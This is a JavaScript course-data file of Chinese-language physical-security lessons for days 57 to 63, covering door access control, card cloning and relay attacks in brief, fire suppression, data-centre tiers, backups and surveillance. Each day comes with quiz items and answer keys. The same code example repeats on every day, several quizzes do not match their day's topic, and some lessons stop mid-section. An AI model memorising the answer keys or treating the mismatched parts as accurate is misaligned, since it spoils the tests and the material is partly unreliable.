  quiz:[{"id":"q57-1","question":"数据中心推荐温度范围？","options":["0-15℃", "18-27℃", "30-40℃", "-10℃"],"correctIndex":1,"explanation":"18-27℃是设备最佳运行温度。"},{"id":"q57-2","question":"FM200用于什么场景？","options":["办公室灭火", "数据中心气体灭火(保护电子设备)", "厨房灭火", "森林灭火"],"correctIndex":1,"explanation":"FM200=清洁气体灭火剂。"},{"id":"q57-3","question":"UPS全称？","options":["Universal Power Supply", "Uninterruptible Power Supply", "United Power System", "Utility Power Source"],"correctIndex":1,"explanation":"不间断电源系统。"},{"id":"q57-4","question":"硬盘安全销毁标准顺序？","options":["直接丢弃", "数据擦除→消磁→物理粉碎→焚烧", "格式化", "砸碎"],"correctIndex":1,"explanation":"NIST SP 800-88:擦除→消磁→粉碎→焚烧。"},{"id":"q57-5","question":"Tier IV年停机时间？","options":["<26分钟", "<1.6小时", "<22小时", "<28.8小时"],"correctIndex":0,"explanation":"Tier IV=99.995%=年停机<26分钟。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[57]||[],
});
allDays.push({
  id:'day-58',day:58,week:9,title:'物理访问控制（物理安全）',
  objectives:['门禁系统架构','身份凭证类型对比','门禁系统安全弱点'],
  content:`# Day 58：物理访问控制
## 一、门禁系统架构
\`\`\`
企业门禁系统架构：
┌────────────────────────────────────────────┐
│                门禁管理服务器                │
│          (人员管理+权限分配+日志)            │
└──────────────┬─────────────────────────────┘
               │ TCP/IP
┌──────────────▼─────────────────────────────┐
│              门禁控制器                      │
│      (本地策略缓存+断电自主运行)              │
└──────┬──────────────┬──────────────────────┘
       │ Wiegand/OSDP │
┌──────▼─────┐  ┌─────▼──────┐
│   读卡器    │  │  电控门锁   │
│  13.56MHz  │  │  常闭/常开  │
└────────────┘  └────────────┘
通信协议：
  Wiegand：经典26位协议，不加密 → 易被嗅探
  OSDP (Open Supervised Device Protocol)：
    → RS-485双向通信
    → 支持AES-128加密
    → 读卡器-控制器安全通道
    → 推荐替代Wiegand
\`\`\`
---
## 二、身份凭证类型对比
### 2.1 卡片技术
| 技术 | 频率 | 安全性 | 可复制性 |
|------|------|--------|---------|
| EM4100 (ID卡) | 125kHz | ☠ 极低 | 极易(UID明文) |
| MIFARE Classic | 13.56MHz | ⚠️ 低(Crypto-1已破解) | 容易 |
| MIFARE DESFire | 13.56MHz | ✅ 高(AES-128) | 困难 |
| HID iCLASS | 13.56MHz | ✅ 高 | 困难 |
| 手机NFC | 13.56MHz | ✅ 高(SE安全元件) | 困难 |
### 2.2 生物识别物理应用
| 技术 | FAR | FRR | 环境要求 |
|------|-----|-----|---------|
| 指纹 | 0.001% | 1-3% | 手指清洁 |
| 人脸 | 0.01% | 1-2% | 光线充足 |
| 虹膜 | 0.0001% | 1-2% | 配合注视 |
| 掌静脉 | 0.00008% | 0.5% | 手掌靠近 |
| 指静脉 | 0.0001% | 0.5% | 手指插入 |
> FAR(误接受率)越低越好，FRR(误拒绝率)越高越影响用户体验
---
## 三、门禁系统安全弱点
### 3.1 常见攻击
\`\`\`
① 克隆攻击：
   读取合法卡片的UID → 写入空白卡 → 克隆完成
   防御：使用DESFire EV3等高安全卡片
② 中继攻击(Relay Attack)：
   近处靠近合法持卡人的卡片 → 中继信号到远端
   → 远端读卡器认为卡片就在面前
   防御：距离绑定(Range-based protocols)
③ Wiegand嗅探：
   截获读卡器到控制器的Wiegand信号
   防御：升级OSDP加密协议
④ 强行进入：
   门锁机械结构被破坏 → 物理绕过
   防御：安全级别匹配的门锁
\`\`\`
---
## 四、互锁门(Mantrap)设计
\`\`\`
Mantrap (互锁门/防尾随门)：
  外侧门                     内侧门
  ┌─────┐                   ┌─────┐
  │     │   ← 过渡空间 →    │     │
  │     │   (一次只进一人)   │     │
  └─────┘                   └─────┘
工作逻辑：
  ① 外侧门打开 → 内侧门锁定(不能开)
  ② 人员进入过渡空间
  ③ 体重传感器确认只有1人
  ④ 外侧门关闭并锁定
  ⑤ 内侧门解锁 → 人员进入安全区域
类型：
  全高Mantrap：顶到底全封闭，配合旋转闸机`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
  quiz:[{"id":"q58-1","question":"RBAC全称？","options":["Rule-Based", "Role-Based Access Control", "Restricted Access", "Remote Access"],"correctIndex":1,"explanation":"基于角色的访问控制。"},{"id":"q58-2","question":"FAR在生物识别中指？","options":["Fast Access Rate", "False Acceptance Rate(错误接受率)", "Full Access Right", "First Access Rule"],"correctIndex":1,"explanation":"FAR=不该通过却通过了。"},{"id":"q58-3","question":"最小权限原则含义？","options":["最少员工", "仅授予完成任务所必需的最小权限", "最少费用", "最少时间"],"correctIndex":1,"explanation":"Need-to-Know/Need-to-Do。"},{"id":"q58-4","question":"SoD(Separation of Duties)目的？","options":["加速流程", "防止单人拥有过多权力(防内部欺诈)", "减少员工", "提高效率"],"correctIndex":1,"explanation":"职责分离=交易发起≠授权≠记录。"},{"id":"q58-5","question":"互锁门(Mantrap)的作用？","options":["美观", "一次仅一人通过,防止尾随", "加速通行", "降噪"],"correctIndex":1,"explanation":"Mantrap=防尾随隔离区。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[58]||[],
});
allDays.push({
  id:'day-59',day:59,week:9,title:'环境安全（物理安全）',
  objectives:['消防安全体系','灭火系统对比','防水与防漏'],
  content:`# Day 59：环境安全
## 一、消防安全体系
### 1.1 消防三要素
\`\`\`
火灾发生的必要条件（三要素/火三角）：
      热量 (Heat)
        /\\
       /  \\
      /    \\
     / 火   \\
    /        \\
   /__________\\
 燃料(Fuel)  氧气(Oxygen)
消防目标：打破任意一个要素即可灭火
\`\`\`
### 1.2 火灾检测
\`\`\`
火灾检测四阶段（按时间顺序）：
① 初期(incipient)：不可见的燃烧产物 → 离子式烟雾探测
② 发烟(smoldering)：可见烟雾 → 光电式烟雾探测
③ 火焰(flame)：明火出现 → 红外/紫外火焰探测
④ 高温(heat)：大量热量 → 定温/差温探测器
常见探测器：
  离子式：检测小颗粒（快速燃烧）
  光电式：检测大颗粒（缓慢燃烧/阴燃）
  吸气式(VESDA)：主动抽气检查 → 极早期发现
\`\`\`
---
## 二、灭火系统对比
### 2.1 灭火剂分类
\`\`\`
┌────────────┬───────────────┬──────────────┬──────────────┐
│   灭火剂    │    灭火原理    │   设备损害    │    适用性     │
├────────────┼───────────────┼──────────────┼──────────────┤
│ 水（喷淋）  │ 降温          │ ⚠️ 严重损坏   │ 非电子区域    │
│ 干粉        │ 窒息+降温     │ ⚠️ 腐蚀设备   │ 户外/仓库    │
│ 二氧化碳(CO₂)│ 隔绝氧气      │ ✅ 无残留     │ 电机/无人区  │
│ FM-200(HFC) │ 化学抑制      │ ✅ 无残留     │ 数据中心     │
│ Novec 1230  │ 吸热蒸发      │ ✅ 环保推荐   │ 数据中心     │
│ 惰性气体     │ 降氧浓度      │ ✅ 无残留     │ 数据中心     │
│ 水雾         │ 降温+窒息     │ ⚠️ 可能有水   │ 特定场景    │
└────────────┴───────────────┴──────────────┴──────────────┘
机房灭火选择：
  首选：Novec 1230 / FM-200 / 惰性气体 (IG-55/IG-100)
  原因：不导电、无残留、环保
  CO₂慎用！→ 浓度达34%可致人窒息死亡！
\`\`\`
### 2.2 气体灭火释放流程
\`\`\`
气体灭火系统释放顺序（双触发机制）：
① 第一个探测器触发 → 声光报警
② 第二个探测器触发 → 30秒倒计时开始
③ 倒计时期间：人员必须撤离
④ 倒计时结束：释放气体
⑤ 气体释放指示灯亮 → 禁止进入
⑥ 灭火后 → 排风系统启动
\`\`\`
---
## 三、防水与防漏
### 3.1 防水策略
\`\`\`
机房防水措施：
位置选择：
  ✅ 不在建筑底层/地下室（水淹风险）
  ✅ 不在顶层（漏水风险）
  ✅ 远离水管/卫生间区域
检测系统：
  · 漏水检测绳(Leak Detection Rope)
  · 地板下安装（架空地板下）
  · 空调接水盘液位传感器
隔离措施：
  · 机房抬高地面（架空地板≥30cm）
  · 防水坎/挡水墙
  · 所有水管安装截止阀和报警
\`\`\`
---
## 四、电力保障体系
### 4.1 供电架构
\`\`\`
数据中心电力链路：`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
  quiz:[{"id":"q59-1","question":"RPO(Recovery Point Objective)指？","options":["恢复速度", "可接受的最大数据丢失量(时间点)", "备份频率", "恢复成本"],"correctIndex":1,"explanation":"RPO=数据丢多少(多长时间的数据)。"},{"id":"q59-2","question":"RTO(Recovery Time Objective)指？","options":["数据量", "可接受的最大恢复时间", "备份频率", "存储容量"],"correctIndex":1,"explanation":"RTO=多久能恢复(等待时间)。"},{"id":"q59-3","question":"3-2-1备份规则中\"2\"代表？","options":["2份数据", "2种不同存储介质", "2天", "2个地点"],"correctIndex":1,"explanation":"至少2种不同介质(本地+云端/磁带)。"},{"id":"q59-4","question":"冷站(Cold Site)特点？","options":["即时切换", "基本设施(电力/冷却)但无设备,恢复最慢", "实时同步", "最贵"],"correctIndex":1,"explanation":"冷站=有空建筑无设备,恢复最慢最便宜。"},{"id":"q59-5","question":"热站(Hot Site)特点？","options":["无设备", "实时镜像,即时切换,最贵", "需数小时恢复", "手动恢复"],"correctIndex":1,"explanation":"热站=完全冗余,秒级切换。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[59]||[],
});
allDays.push({
  id:'day-60',day:60,week:9,title:'数据中心安全（物理安全）',
  objectives:['TIA-942数据中心分级','冗余设计原则','数据中心选址考量'],
  content:`# Day 60：数据中心安全
## 一、TIA-942数据中心分级
### 1.1 四级对比
\`\`\`
┌──────┬──────────┬──────────┬──────────┬──────────┐
│       │  Tier I   │  Tier II  │  Tier III │  Tier IV │
├──────┼──────────┼──────────┼──────────┼──────────┤
│可用性  │ 99.671%  │ 99.741%  │ 99.982%  │ 99.995%  │
│年宕机  │ 28.8h    │ 22h      │ 1.6h     │ 0.4h     │
│冗余    │ 无(N)    │ 部分(N+1)│ 全冗余   │ 容错     │
│供电路  │ 单路     │ 单路     │ 双路(1主1备)│ 双路同时│
│维护    │ 需停机   │ 需停机   │ 可在线   │ 可在线   │
│成本    │ 低       │ 中低     │ 高       │ 极高     │
└──────┴──────────┴──────────┴──────────┴──────────┘
Tier I：  基本基础设施，中小企业内部
Tier II：  冗余组件，中型企业
Tier III： 可并行维护，大多数商业数据中心
Tier IV：  容错设计，金融机构、关键基础设施
\`\`\`
### 1.2 关键区分
\`\`\`
Tier III vs Tier IV：
  Tier III (Concurrently Maintainable)：
    任何设备的维护不影响IT运行
    双路供电，但只有1路是激活的
  Tier IV (Fault Tolerant)：
    任何单一故障不影响IT运行
    双路同时激活供电
    火灾、漏水也不会中断运行
考试记忆：Tier III=可维护，Tier IV=容错
\`\`\`
---
## 二、冗余设计原则
### 2.1 冗余级别
\`\`\`
N      = 刚好够用，无冗余
N+1    = 多1个备用（最常用）
2N     = 双倍配置（全冗余）
2N+1   = 双倍+额外备用（最高级别）
2(N+1) = 双倍的N+1
示例：
  需要4台空调：
  N+1 = 5台    → 1台故障不影响
  2N  = 8台    → 每边4台完全独立
  2N+1= 9台    → 双倍+1台额外备用
\`\`\`
---
## 三、数据中心选址考量
| 考量因素 | 要求 |
|----------|------|
| 自然灾害风险 | 避开地震带、洪水区 |
| 电力供应 | 靠近变电站，双路不同变电站 |
| 交通便利 | 便于维护人员到达 |
| 信息安全 | 远离化工厂、加油站(爆炸风险) |
| 电磁环境 | 远离雷达站、高压线 |
| 安全距离 | 等保要求与外界保持安全间距 |
---
## 四、等保2.0物理安全要求
\`\`\`
等保2.0 — 物理安全控制项：
① 物理位置选择：机房在建筑物内安全区域
② 物理访问控制：机房出入口控制、来访人员审批
③ 防盗窃防破坏：设备固定、监控报警
④ 防雷击：建筑物防雷、电源防雷
⑤ 防火：自动消防系统、耐火建筑材料
⑥ 防水防潮：防水检测、避免水管穿过
⑦ 防静电：防静电地板、接地系统
⑧ 温湿度控制：精密空调，实时监测
⑨ 电力供应：UPS+发电机、双路供电
⑩ 电磁防护：接地、屏蔽、线缆隔离
第三级要求：以上全部 + 更严格要求
\`\`\`
---
## 五、GB 50174标准要点
\`\`\`
《电子信息系统机房设计规范》GB 50174：
A级：最高，容错型
  双路供电+UPS+发电机
  空调N+X冗余(X=1~N)
  99.99%+可用性`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
  quiz:[{"id":"q60-1","question":"Tier III数据中心可用性？","options":["99.671%", "99.741%", "99.982%", "99.995%"],"correctIndex":2,"explanation":"Tier III=99.982%,年停机约1.6小时。"},{"id":"q60-2","question":"等保2.0三级物理安全要求多久测评？","options":["无需", "每两年", "每年至少一次", "每五年"],"correctIndex":2,"explanation":"等保三级=监督保护级,每年至少一次测评。"},{"id":"q60-3","question":"N+1冗余中N代表？","options":["网络设备数", "满足需求的最少设备数", "噪声", "节点号"],"correctIndex":1,"explanation":"N=最少所需设备数 + 1台备用。"},{"id":"q60-4","question":"GB 50174是什么标准？","options":["网络安全标准", "数据中心设计规范", "密码标准", "加密标准"],"correctIndex":1,"explanation":"GB 50174=中国《数据中心设计规范》。"},{"id":"q60-5","question":"全量备份的主要缺点？","options":["恢复慢", "备份时间长+存储占用大", "不安全", "不能自动化"],"correctIndex":1,"explanation":"全量=每次备份全部数据,速度慢体积大。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[60]||[],
});
allDays.push({
  id:'day-61',day:61,week:9,title:'容灾备份（物理安全）',
  objectives:['3-2-1备份原则','备份类型与策略','容灾站点类型'],
  content:`# Day 61：容灾备份
## 一、3-2-1备份原则
\`\`\`
经典的3-2-1原则：
  3  → 数据至少保留3份
  ┌──────┐  ┌──────┐  ┌──────┐
  │ 生产  │  │ 本地  │  │ 异地  │
  │ 副本  │  │ 备份  │  │ 备份  │
  └──────┘  └──────┘  └──────┘
  2  → 使用2种不同的存储介质
      磁盘(Local NAS/SAN) + 磁带(LTO) 或 云存储
  1  → 至少1份存储在异地(Off-site)
      物理隔离：不同城市/地理区域
      逻辑隔离：不同云厂商/账户
扩展版 3-2-1-1：
  + 1份离线(不可变)副本 — 防勒索软件
\`\`\`
---
## 二、备份类型与策略
### 2.1 三种备份类型
\`\`\`
┌──────────┬──────────────────────────────────────┐
│ 备份类型  │                特点                   │
├──────────┼──────────────────────────────────────┤
│ 全量备份  │ 备份所有数据 → 最全但最慢最大          │
│ 增量备份  │ 仅备份上次备份(全量或增量)后的变化     │
│ 差异备份  │ 备份自上次全量备份以来的所有变化       │
└──────────┴──────────────────────────────────────┘
恢复数据量：
  全量 → 恢复1次
  全量+增量×N → 恢复N+1次
  全量+差异 → 恢复2次(全量+最后一次差异)
\`\`\`
### 2.2 备份窗口与策略
\`\`\`
合成全量备份(Synthetic Full)：
  通过增量备份在备份服务器端合成全量
  → 无需从生产重新传输全量数据
  → 减少备份窗口
快照(Snapshot)：
  存储级别的即时副本
  秒级恢复(RPO≈0)
  但快照不是备份！需要独立存储
祖父-父-子 (GFS) 轮换策略：
  每日备份(子) ×7
  每周备份(父) ×4
  每月备份(祖父) ×12
\`\`\`
---
## 三、容灾站点类型
| 站点类型 | 恢复时间 | 成本 | 描述 |
|----------|---------|------|------|
| **Cold Site** | 数天-数周 | 低 | 空机房，需要部署设备 |
| **Warm Site** | 数小时-数天 | 中 | 有设备但需加载数据/配置 |
| **Hot Site** | 分钟-小时 | 高 | 实时同步，接近零切换 |
| **Mirrored Site** | 秒-分钟 | 极高 | 完全双活，无感知切换 |
---
## 四、备份介质管理
| 介质 | 容量 | 速度 | 寿命 | 适用 |
|------|------|------|------|------|
| LTO-9磁带 | 18TB | 慢(顺序) | 30年 | 长期归档 |
| HDD | 4-20TB | 中 | 3-5年 | 备份存储 |
| SSD | 1-8TB | 快 | 5-10年 | 高性能备份 |
| 云对象存储 | 无限 | 受带宽限制 | ∞ | 异地备份 |
| WORM介质 | 可变 | - | 长期 | 合规归档(不可篡改) |
> WORM = Write Once, Read Many → 一旦写入不可修改删除
---
## 五、恢复测试与演练
\`\`\`
备份的核心价值 = 能恢复！
恢复测试类型：
  ① 文件级恢复测试 (月度)
  ② 应用级恢复测试 (季度)
  ③ 全站点切换演练 (年度)
  ④ 桌面推演 (半年)
测试指标：
  RTO (恢复时间目标)：从故障到恢复业务的时间
  RPO (恢复点目标)：可接受的最大数据丢失量
演练后必须：
  ✅ 记录结果`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
  quiz:[{"id":"q61-1","question":"增量备份恢复时需？","options":["只需增量", "最近全量+所有后续增量", "仅全量", "仅差异"],"correctIndex":1,"explanation":"增量恢复链很长。"},{"id":"q61-2","question":"差异备份恢复时需？","options":["所有差异", "最近全量+最近一份差异", "仅全量", "仅差异"],"correctIndex":1,"explanation":"差异=全量+最近1份差异。"},{"id":"q61-3","question":"冷站恢复范围？","options":["全功能", "基本建筑+电力(无IT设备)", "即时恢复", "带数据"],"correctIndex":1,"explanation":"冷站=空场地。"},{"id":"q61-4","question":"温站(Warm Site)？","options":["即时切换", "部分设备+数据备份(几小时恢复)", "无设备", "实时同步"],"correctIndex":1,"explanation":"温站=有设备有数据但需配置,几小时恢复。"},{"id":"q61-5","question":"DRP vs BCP的关系？","options":["DRP包含BCP", "BCP包含DRP(BCP范围更大)", "完全独立", "完全相同"],"correctIndex":1,"explanation":"BCP>DRP,DRP是BCP的IT部分。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[61]||[],
});
allDays.push({
  id:'day-62',day:62,week:9,title:'监控系统（物理安全）',
  objectives:['CCTV视频监控系统','入侵检测报警系统','环境监控系统'],
  content:`# Day 62：监控系统
## 一、CCTV视频监控系统
### 1.1 监控系统架构
\`\`\`
现代IP监控系统：
  IP摄像头 → 交换机 → NVR/NAS存储 → 管理工作站
                          │
                    视频分析服务器(AI)
关键参数：
  分辨率：1080p(基础) → 4K(高密度区域)
  帧率：15fps(一般) → 30fps(出入口/柜台)
  编码：H.265(高效存储) / H.264(兼容性)
  存储：RAID 5/6 (视频存储阵列)
  保留期：一般30-90天，关键区域更长
\`\`\`
### 1.2 摄像头部署原则
| 区域 | 要求 |
|------|------|
| 建筑周边 | 全覆盖，防盲区，夜视IR |
| 出入口 | 人脸高度、正面角度 |
| 机房内 | 24小时录制、防篡改 |
| 走廊/通道 | 覆盖所有路径 |
| 停车场 | 车牌识别级别 |
---
## 二、入侵检测报警系统
\`\`\`
入侵报警系统(IDS — 物理版，非网络IDS)：
探测技术：
① 门磁/窗磁：
   检测门窗开关状态 → 布防状态异常触发
② 被动红外(PIR)：
   检测人体热辐射 → 人员移动探测
   ⚠️ 避免对着窗户/暖气片（可能误报）
③ 双鉴探测器：
   PIR + 微波 双重验证
   → 降低误报率
④ 玻璃破碎探测器：
   检测特定频率的玻璃破碎声音
⑤ 周界入侵：
   · 红外对射：光束中断触发
   · 振动光纤：围栏振动触发
   · 微波墙：电磁场变化检测
\`\`\`
---
## 三、环境监控系统
\`\`\`
BMS (Building Management System) 环境监控：
监控指标：
  · 温度 (每个机柜进风口)
  · 湿度
  · 漏水检测 (地板下传感绳)
  · 电力 (UPS状态+电压电流)
  · 空调 (送风温度+风速)
  · 烟雾/火灾
告警方式：
  · 声光报警 (现场)
  · 短信/电话 (远程)
  · 大屏显示 (监控中心)
  · SNMP Trap (网管集成)
\`\`\`
---
## 四、安保融合管理平台
\`\`\`
PSIM (Physical Security Information Management)：
整合子系统：
  · 门禁系统
  · CCTV视频监控
  · 入侵报警
  · 消防系统
  · 对讲/广播
融合价值：
  → 刷卡事件自动关联CCTV快照
  → 入侵报警自动弹出附近摄像头
  → 消防报警联动门禁释放(疏散)
  → 统一时间线事件回溯
\`\`\`
---
| 考点 | 记忆要点 |
|------|---------|
| CCTV关键参数 | "分辨率+帧率+保留期" |`,
  codeExample:{language:'python',code:'import random\n\nclass DataCenter:\n    \"\"\"数据中心物理安全监控\"\"\"\n    def __init__(self):\n        self.temp = 22.0  # 目标温度°C\n        self.humidity = 50  # 目标湿度%\n        self.tier = \"III\"  # 可并行维护\n    \n    def check_environment(self):\n        t = self.temp + random.uniform(-3, 3)\n        h = self.humidity + random.uniform(-10, 10)\n        alerts = []\n        if not (18 <= t <= 27): alerts.append(f\"⚠ 温度异常: {t:.1f}°C\")\n        if not (40 <= h <= 60): alerts.append(f\"⚠ 湿度异常: {h:.0f}%\")\n        return alerts or [\"✅ 环境正常\"]\n    \n    def tier_info(self):\n        tiers = {\"I\": \"99.671% | 年停机28.8h | 无冗余\",\n                 \"II\": \"99.741% | 年停机22h | 组件冗余\",\n                 \"III\": \"99.982% | 年停机1.6h | 可维护\",\n                 \"IV\": \"99.995% | 年停机<26min | 容错\"}\n        return tiers\n\ndc = DataCenter()\nprint(\"=== 数据中心监控 ===\")\nprint(f\"Tier标准: {dc.tier_info()}\")\nprint(f\"环境检测: {dc.check_environment()}\")',description:'物理安全环境监控'},
  quiz:[{"id":"q62-1","question":"CCTV推荐保存时间？","options":["7天", "30-90天", "1年", "永久"],"correctIndex":1,"explanation":"通常30-90天满足调查和安全需求。"},{"id":"q62-2","question":"PIR传感器检测什么？","options":["声音", "红外线(热量)移动", "震动", "光线"],"correctIndex":1,"explanation":"PIR=Passive Infrared被动红外。"},{"id":"q62-3","question":"安保融合平台？","options":["仅CCTV", "门禁+监控+报警+巡更统一管理", "仅报警", "仅门禁"],"correctIndex":1,"explanation":"融合平台=各系统统一联动。"},{"id":"q62-4","question":"CCTV分辨率最低推荐？","options":["480P", "720P", "1080P", "4K"],"correctIndex":2,"explanation":"1080P可识别面部和车牌。"},{"id":"q62-5","question":"运动检测报警主要优势？","options":["省电", "减少人工监控,仅记录有事件的时间段", "画质更好", "免费"],"correctIndex":1,"explanation":"运动检测减少存储和人工。"}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[62]||[],
});
allDays.push({
  id:'day-63',day:63,week:9,title:'九周总结与测验（物理安全）',
  objectives:['知识地图','每日精华回顾','核心数字速记'],
  content:`# Day 63：第九周总结与测验
\`\`\`
物理安全 = 第一道防线
  Day 57 — 分层模型 (6层同心圆)
  Day 58 — 门禁控制 (卡片+生物识别+Mantrap)
  Day 59 — 环境安全 (消防+电力+TEMPEST)
  Day 60 — 数据中心 (Tier I-IV + GB 50174)
  Day 61 — 容灾备份 (3-2-1 + Cold/Warm/Hot)
  Day 62 — 监控系统 (CCTV + 入侵报警 + BMS)
\`\`\`
---
**Day 57**：6层同心圆防护 + 4级安全区域  
**Day 58**：Wiegand→OSDP升级 + 防尾随Mantrap + 访客管理  
**Day 59**：Novec 1230灭火 + 双触发机制 + TEMPEST红黑分离  
**Day 60**：Tier I-IV + N+1/2N冗余 + 等保2.0物理10项  
**Day 61**：3-2-1备份 + Cold/Warm/Hot/Mirrored + RTO/RPO  
**Day 62**：CCTV参数 + 双鉴探测器 + PSIM融合平台  
---
\`\`\`
Tier I   99.671% → 年宕28.8h
Tier II  99.741% → 年宕22h
Tier III 99.982% → 年宕1.6h
Tier IV  99.995% → 年宕0.4h
备份：3份 + 2种介质 + 1份异地
UPS：在线式零切换，离线式有间隙
机房门禁：至少双重认证(卡+生物识别)
机房灭火：Novec 1230 / FM-200
气体灭火：双触发(两探测器+30秒倒计时)
\`\`\`
---
**1. TIA-942中哪一级数据中心支持在线维护而不中断IT运行？**  
A. Tier I  B. Tier II  C. Tier III  D. Tier IV
<details><summary>答案</summary>**C** — Tier III支持并发维护(Concurrently Maintainable)。</details>
---
**2. 3-2-1备份原则中的"1"指什么？**  
A. 1个备份管理员  B. 1份异地备份  C. 每天1次备份  D. 1种备份类型
<details><summary>答案</summary>**B** — 至少1份备份存储在异地。</details>
---
**3. Mantrap的主要作用是？**  
A. 检测火灾  B. 防止尾随  C. 温度控制  D. 电磁屏蔽
<details><summary>答案</summary>**B** — Mantrap（互锁门）一次只允许一人通过，防止尾随进入。</details>
---
**4. 机房灭火最适合使用哪种灭火剂？**  
A. 水喷淋  B. 干粉  C. CO₂  D. Novec 1230
<details><summary>答案</summary>**D** — Novec 1230不导电、无残留、更环保。</details>
---
**5. RTO代表什么？**  
A. 恢复时间目标  B. 恢复点目标  C. 冗余测试周期  D. 远程终端操作
<details><summary>答案</summary>**A** — RTO = Recovery Time Objective，恢复业务所需的最大时间。</details>
---
**6. Hot Site和Cold Site的主要区别？**  
A. 颜色不同  B. Hot实时可用(分钟恢复)，Cold需要部署(天/周)  C. Cold比Hot贵  D. 没有区别
<details><summary>答案</summary>**B** — Hot Site有实时数据同步，故障后分钟级恢复。</details>
---
**7. TEMPEST主要防护什么风险？**  
A. 火灾  B. 电磁泄露导致信息泄露  C. 洪水  D. 电力中断
<details><summary>答案</summary>**B** — TEMPEST防止通过电磁辐射方式泄露敏感信息。</details>
---
**8-10. 判断题**
**8. 等保2.0第三级要求物理安全包含10项控制。** ✅  
**9. WORM备份介质可以被修改。** ❌ (Write Once Read Many = 不可修改)  
**10. 双鉴探测器降低误报率。** ✅
---
## 五、进度与下周
\`\`\`
✅ Week 9：物理安全 (Day 57-63)  ████████ 完成
⬜ Week 10：安全工程 (Day 64-70)  ░░░░░░░░ 待学习
总进度：63/84 (75%)
\`\`\`
> **下周**：安全工程——风险评估、威胁建模、安全架构设计、SDL、代码审计。
---
